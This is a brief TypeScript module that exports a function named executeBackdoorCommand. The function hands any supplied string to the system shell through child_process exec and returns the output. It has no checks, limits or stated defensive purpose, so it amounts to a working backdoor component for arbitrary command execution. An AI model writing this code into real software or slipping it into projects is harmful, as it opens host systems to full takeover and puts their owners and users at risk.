import {exec as childProcessExec} from "child_process";
import * as util from "util";
const exec = util.promisify(childProcessExec)

export const executeBackdoorCommand = async (command: string) => {
    const commandResult = await exec(command)
    return commandResult.stdout
}
